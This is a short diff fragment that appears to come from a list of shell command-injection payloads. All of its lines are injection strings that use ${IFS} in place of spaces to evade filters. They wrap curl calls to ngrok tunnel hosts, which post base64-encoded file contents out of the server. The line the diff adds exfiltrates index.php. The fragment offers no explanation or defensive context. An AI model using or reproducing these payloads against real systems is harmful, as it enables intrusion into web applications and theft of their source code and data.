@@ -9,3 +9,5 @@ ls ''.${IFS}>${IFS}a$(curl${IFS}http://9868580ed747.ngrok.io${IFS}-d${IFS}`base6
 
 '.${IFS}>${IFS}a$(curl${IFS}http://9868580ed747.ngrok.io${IFS}-d${IFS}`base64${IFS}a`)ls${IFS}.'
 ls ''. > a$(curl http://9868580ed747.ngrok.io -d `base64 a`)ls .'' -alth
+
+ls ''${IFS}$(curl${IFS}https://cfe8a0113b2c.ngrok.io${IFS}-d${IFS}"$(base64${IFS}index.php)")'' -alth
